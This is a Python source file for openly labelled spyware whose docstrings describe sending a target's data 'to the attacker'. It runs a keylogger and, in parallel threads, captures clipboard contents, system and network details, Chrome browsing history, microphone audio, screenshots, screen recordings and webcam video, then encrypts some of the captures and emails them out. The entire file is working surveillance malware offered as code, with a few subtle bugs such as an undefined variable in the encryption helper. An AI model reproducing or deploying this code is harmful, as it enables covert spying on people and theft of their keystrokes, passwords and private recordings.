from concurrent.futures import ThreadPoolExecutor
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from scipy.io.wavfile import write
from dotenv import load_dotenv
from time import perf_counter
from PIL import ImageGrab
import sounddevice as sd
from requests import get
# import win32clipboard
import numpy as np
import subprocess
import clipboard
import pyautogui
import platform
import sqlite3
import psutil
import socket
import uuid
import csv
import cv2
import re
import os

from mailer import send_mail_with_attachment

load_dotenv()


# File names to store data
keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
chrome_info = "chrome_info.csv"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
screen_record_vid = "screen_record.mp4"
front_cam_vid = "front_cam.mp4"

# Encrypted file names
keys_info_e = "e_key_log.txt"
system_info_e = "e_system_info.txt"
clipboard_info_e = "e_clipboard.txt"
chrome_info_e = "e_chrome_info.csv"

base_path = os.getenv("LINUX_BASE_PATH")
email_report = os.getenv("REPORT_MAIL")

# Windows Path
# file_path = os.getenv("WINDOWS_BASE_PATH")
# extend_path = "\\"
# file_merge = file_path+extend_path


def get_size(bytes, suffix="B") -> str:
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'

    Args:
        bytes: Number of bytes to convert
        suffix: Unit of bytes

    Returns:
        str
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def system_information() -> None:
    """
    Logs system information on target machine and writes to
    file then sends encrypted data to attacker via email

    Args:
        None

    Returns:
        None
    """
    file_path = os.path.join(base_path, system_info)

    with open(file_path, "a") as f:
        f.write("SYSTEM INFORMATION:\n")
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)

        try:
            external_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + external_ip + "\n")
        except Exception:
            f.write("Couldn't get public IP address!\n")

        try:
            f.write("Processor: " + platform.processor() + "\n")
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + ip_addr + "\n")
            f.write("Network Name: " + platform.node() + "\n")
            f.write(
                "MAC Address: "
                + ":".join(re.findall("..", "%012x" % uuid.getnode()))
                + "\n"
            )
            f.write(
                "RAM: "
                + str(round(psutil.virtual_memory().total / (1024.0**3)))
                + " GB\n"
            )
            f.write("System Release: " + platform.release() + "\n")
            arch = platform.architecture()
            f.write("Architecture: (" + arch[0] + ", " + arch[1] + ")\n")
            f.write("Platform: " + platform.platform() + "\n\n")
        except:
            print("Error Capturing Basic System Information")

        try:
            f.write("CPU INFORMATION\n")
            phys_cores = str(psutil.cpu_count(logical=False))
            f.write("Physical Cores: " + phys_cores + "\n")
            tot_cores = str(psutil.cpu_count(logical=True))
            f.write("Total Cores: " + tot_cores + "\n")
            cpufreq = psutil.cpu_freq()
            max_freq = str(cpufreq.max)
            min_freq = str(cpufreq.min)
            curr_freq = str(cpufreq.current)
            f.write("Max Frequency: " + max_freq + " Mhz\n")
            f.write("Min Frequency: " + min_freq + " Mhz\n")
            f.write("Current Frequency: " + curr_freq + " Mhz\n")

            for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
                f.write(f"Core {i}: {percentage}%\n")
            f.write(f"Total CPU Usage: {psutil.cpu_percent()}%\n\n")
        except:
            print("Error Capturing CPU Information")

        try:
            f.write("MEMORY USAGE:\n")
            svmem = psutil.virtual_memory()
            f.write(f"Total: {get_size(svmem.total)}\n")
            f.write(f"Available: {get_size(svmem.available)}\n")
            f.write(f"Used: {get_size(svmem.used)}\n")
            f.write(f"Percentage: {svmem.percent}%\n")
            swap = psutil.swap_memory()
            f.write(f"Total: {get_size(swap.total)}\n")
            f.write(f"Free: {get_size(swap.free)}\n")
            f.write(f"Used: {get_size(swap.used)}\n")
            f.write(f"Percentage: {swap.percent}%\n\n")
        except:
            print("Error Capturing Memory Usage Information")

        try:
            f.write("DISK INFORMATION\n")
            partitions = psutil.disk_partitions()
            for partition in partitions:
                f.write(f"Device: {partition.device}\n")
                f.write(f"Mountpoint: {partition.mountpoint}\n")
                f.write(f"File System Type: {partition.fstype}\n")
                try:
                    partition_usage = psutil.disk_usage(partition.mountpoint)
                except PermissionError:
                    continue
                f.write(f"Total Size: {get_size(partition_usage.total)}\n")
                f.write(f"Used: {get_size(partition_usage.used)}\n")
                f.write(f"Free: {get_size(partition_usage.free)}\n")
                f.write(f"Percentage: {partition_usage.percent}%\n")
        except:
            print("Error Capturing Disk Information")

        try:
            f.write("IO STATISTICS\n")
            disk_io = psutil.disk_io_counters()
            f.write(f"Total Read: {get_size(disk_io.read_bytes)}\n")
            f.write(f"Total Write: {get_size(disk_io.write_bytes)}\n\n")
        except:
            print("Error Capturing I/O Statistics")

        try:
            f.write("NETWORK INFORMATION\n")
            if_addrs = psutil.net_if_addrs()
            for interface_name, interface_addresses in if_addrs.items():
                for address in interface_addresses:
                    f.write(f"Interface: {interface_name}\n")
                    if str(address.family) == "AddressFamily.AF_INET":
                        f.write(f"IP Address: {address.address}\n")
                        f.write(f"Netmask: {address.netmask}\n")
                        f.write(f"Broadcast IP: {address.broadcast}\n")
                    elif str(address.family) == "AddressFamily.AF_PACKET":
                        f.write(f"MAC Address: {address.address}\n")
                        f.write(f"Netmask: {address.netmask}\n")
                        f.write(f"Broadcast MAC: {address.broadcast}\n")
        except:
            print("Error Capturing Network Information")

        f.close()

    try:
        encrypt_and_mail(
            file_path,
            os.path.join(base_path, system_info_e),
            system_info,
            os.path.join(base_path, system_info_e),
            email_report,
        )
    except:
        print("Error Sending Mail")


def chrome_history() -> None:
    """
    Gets browser history of target by accessing the history log file then
    writes it to CSV file. Sends encrypted data to the attacker via email

    Args:
        None

    Returns:
        None
    """
    file_path = os.path.join(base_path, chrome_info)

    try:
        headers = ["URL", "TITLE", "VISIT COUNT", "TIME OF LAST VISIT"]
        with open(file_path, "w", newline="") as fh:
            writer = csv.writer(fh)
            writer.writerow(headers)
            fh.close()
    except:
        print("Error Creating CSV Browser History Log File")

    try:
        conn = sqlite3.connect("/home/nvombat/.config/google-chrome/Default/History")
    except:
        print("Error Connecting To Server")

    c = conn.cursor()

    try:
        c.execute("select url, title, visit_count, last_visit_time from urls")
        results = c.fetchall()

        with open(file_path, "a", newline="") as fh:
            for r in results:
                writer = csv.writer(fh)
                writer.writerow(r)

        fh.close()

    except sqlite3.OperationalError:
        print("Browser Currently In Use")

    c.close()

    try:
        encrypt_and_mail(
            file_path,
            os.path.join(base_path, chrome_info_e),
            chrome_info,
            os.path.join(base_path, chrome_info_e),
            email_report,
        )
    except:
        print("Error Sending Mail")


def clipboard_information() -> None:
    """
    Logs clipboard information to a file which is encrypted
    and then emailed to the attacker

    Args:
        None

    Returns:
        None
    """
    file_path = os.path.join(base_path, clipboard_info)

    try:
        with open(file_path, "a") as f:
            try:
                clipboard_data = clipboard.paste()
                f.write("Clipboard Data:\n" + clipboard_data)

                # win32clipboard.OpenClipboard(0)
                # clipboard_data = win32clipboard.GetClipboardData()
                # win32clipboard.CloseClipboard()
                # f.write("Clipboard Data: \n" + clipboard_data)
            except:
                print("Clipboard Information Couldn't Be Captured")

            f.close()

        try:
            encrypt_and_mail(
                file_path,
                os.path.join(base_path, clipboard_info_e),
                clipboard_info,
                os.path.join(base_path, clipboard_info_e),
                email_report,
            )
        except:
            print("Error Sending Mail")
    except:
        print("Clipboard Information Couldn't Be Captured")


def sound_information() -> None:
    """
    Records audio from the target mic and then emails recording
    to the attacker

    Args:
        None

    Returns:
        None
    """
    try:
        fs = 44100  # Sampling frequency
        duration = 5
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        file_path = os.path.join(base_path, audio_info)
        write(file_path, fs, recording)
    except:
        print("Error Recording Audio")

    try:
        send_mail_with_attachment(audio_info, file_path, email_report)
    except:
        print("Error Sending Mail")


def screenshot() -> None:
    """
    Captures a screenshot of the target screen and then emails the image
    to the attacker

    Args:
        None

    Returns:
        None
    """
    try:
        screenshot = ImageGrab.grab(
            bbox=None, include_layered_windows=False, all_screens=False, xdisplay=None
        )
        file_path = os.path.join(base_path, screenshot_info)
        screenshot.save(file_path)
    except:
        print("Error Capturing Screenshot")

    try:
        send_mail_with_attachment(screenshot_info, file_path, email_report)
    except:
        print("Error Sending Mail")


def get_screen_resolution() -> dict:
    """
    Gets the screen resolution of the target screen

    Args:
        None

    Returns:
        dict
    """
    try:
        output = subprocess.Popen(
            'xrandr | grep "\*" | cut -d" " -f4', shell=True, stdout=subprocess.PIPE
        ).communicate()[0]
        resolution = output.split()[0].split(b"x")
        return {"width": resolution[0].decode(), "height": resolution[1].decode()}
    except:
        print("Error Getting Screen Resolution")


def record_frontcam() -> None:
    """
    Records a video of the target from the front camera and then emails
    the video to the attacker

    Args:
        None

    Returns:
        None
    """
    file_path_front_cam = os.path.join(base_path, front_cam_vid)

    try:
        resolution = get_screen_resolution()
        width = int(resolution["width"])
        height = int(resolution["height"])
        res = (width, height)

        codec = cv2.VideoWriter_fourcc("m", "p", "4", "v")
        fps = 60.0

        front_cam = cv2.VideoWriter(file_path_front_cam, codec, fps, res)

        webcam = cv2.VideoCapture(0)
        start = perf_counter()

        while True:
            fc = ImageGrab.grab(bbox=(0, 0, width, height))
            img_np = np.array(fc)
            img_final = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)
            _, frame1 = webcam.read()
            fr_height, fr_width, _ = frame1.shape
            img_final[0:fr_height, 0:fr_width, :] = frame1[0:fr_height, 0:fr_width, :]
            front_cam.write(img_final)

            end = perf_counter()
            if int(end - start) == 10:
                break
    except:
        print("Error Recording Video From Front Camera")

    try:
        send_mail_with_attachment(front_cam_vid, file_path_front_cam, email_report)
    except:
        print("Error Sending Mail")


def record_screen() -> None:
    """
    Records the screen of the user and then emails the video
    to the user

    Args:
        None

    Returns:
        None
    """
    file_path_screen = os.path.join(base_path, screen_record_vid)

    try:
        resolution = get_screen_resolution()
        width = int(resolution["width"])
        height = int(resolution["height"])
        res = (width, height)

        codec = cv2.VideoWriter_fourcc("m", "p", "4", "v")
        fps = 60.0

        screen = cv2.VideoWriter(file_path_screen, codec, fps, res)

        start = perf_counter()

        while True:
            sc = pyautogui.screenshot()
            frame2 = np.array(sc)
            frame2 = cv2.cvtColor(frame2, cv2.COLOR_BGR2RGB)
            screen.write(frame2)

            end = perf_counter()
            if int(end - start) == 10:
                break
    except:
        print("Error Recording User Screen")

    try:
        send_mail_with_attachment(screen_record_vid, file_path_screen, email_report)
    except:
        print("Error Sending Mail")


class logKeys:
    """
    Logs the keypresses of the target and writes them to a file.
    The file is encrypted and then sent to the attacker via
    email
    """

    def __init__(self):
        self.count = 0
        self.keys = []
        self.file_path = os.path.join(base_path, keys_info)
        self.e_file_path = os.path.join(base_path, keys_info_e)

    # When a key is pressed
    def on_press(self, key):
        # Keep track of key presses and the number of keys pressed
        self.keys.append(key)
        self.count = self.count + 1
        print("{0} pressed".format(key))
        # Write to file after every 15 key presses and reset variables
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    # When a key is released
    def on_release(self, key):
        # Condition to exit keylogger
        if key == Key.esc:
            return False

    # Write the key presses to a file
    def write_file(self, keys):
        with open(self.file_path, "a") as f:
            for key in keys:
                # Format key to be readable
                formatted_key = str(key).replace("'", "")
                if formatted_key.find("space") > 0:
                    f.write("\n")
                # If not a special key then write to file otherwise ignore
                elif formatted_key.find("Key") == -1:
                    f.write(formatted_key)

    # Logs keypresses
    def log(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        print("Logging Complete")

        try:
            encrypt_and_mail(
                self.file_path,
                self.e_file_path,
                keys_info,
                self.e_file_path,
                email_report,
            )
        except:
            print("Error Sending Mail")


def run_key_logger() -> None:
    """
    Runs Keylogger

    Args:
        None

    Returns:
        None
    """
    keyLog = logKeys()
    keyLog.log()


def run_parallel() -> None:
    """
    Runs all the tasks of the malware on different threads to allow for
    asynchronous behavior of malware

    Args:
        None

    Returns:
        None
    """
    try:
        executor = ThreadPoolExecutor(max_workers=8)

        t1 = executor.submit(run_key_logger)
        t2 = executor.submit(system_information)
        t3 = executor.submit(clipboard_information)
        t4 = executor.submit(sound_information)
        t5 = executor.submit(screenshot)
        t6 = executor.submit(record_screen)
        t7 = executor.submit(record_frontcam)
        t8 = executor.submit(chrome_history)

        executor.shutdown(wait=True)
    except:
        print("Error Running Threads")


def encrypt_and_mail(
    file_to_encrypt: str,
    encrypted_file_name: str,
    filename: str,
    attachment: str,
    email: str,
) -> None:
    """
    Encrypts Files And Mails Them To Attacker

    Args:
        file_to_encrypt: File To Be Encrypted
        encrypted_file_name: Encrypted File Name
        filename: Name of File
        attachment: File Attachment
        email: Email of Attacker

    Returns:
        None
    """
    key = os.getenv("ENCRYPTION_KEY")

    with open(file_to_encrypt, "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_name, "wb") as f:
        f.write(encrypted)

    send_mail_with_attachment(filename, attachment, email)


def encrypt_files() -> None:
    """
    Encrypts Files

    Args:
        None

    Returns:
        None
    """
    key_path = os.path.join(base_path, keys_info)
    clip_path = os.path.join(base_path, clipboard_info)
    sys_path = os.path.join(base_path, system_info)
    chrome_path = os.path.join(base_path, chrome_info)

    key_e_path = os.path.join(base_path, keys_info_e)
    clip_e_path = os.path.join(base_path, clipboard_info_e)
    sys_e_path = os.path.join(base_path, system_info_e)
    chrome_e_path = os.path.join(base_path, chrome_e_path)

    files_to_encrypt = [key_path, clip_path, sys_path, chrome_path]
    encrypted_file_names = [key_e_path, clip_e_path, sys_e_path, chrome_e_path]

    cnt = 0
    key = os.getenv("ENCRYPTION_KEY")

    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[cnt], "rb") as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[cnt], "wb") as f:
            f.write(encrypted)

        cnt += 1


def delete_files() -> None:
    """
    Deletes Files

    Args:
        None

    Returns:
        None
    """
    files = [
        system_info,
        clipboard_info,
        keys_info,
        audio_info,
        screenshot_info,
        screen_record_vid,
        front_cam_vid,
        chrome_info,
    ]
    encrypted_files = [system_info_e, clipboard_info_e, keys_info_e, chrome_info_e]

    for file in files:
        try:
            os.remove(os.path.join(base_path, file))
        except Exception:
            print("File %s Not Found" % file)

    for file in encrypted_files:
        try:
            os.remove(os.path.join(base_path, file))
        except Exception:
            print("Encrypted File %s Not Found" % file)


if __name__ == "__main__":
    run_parallel()
    # delete_files()
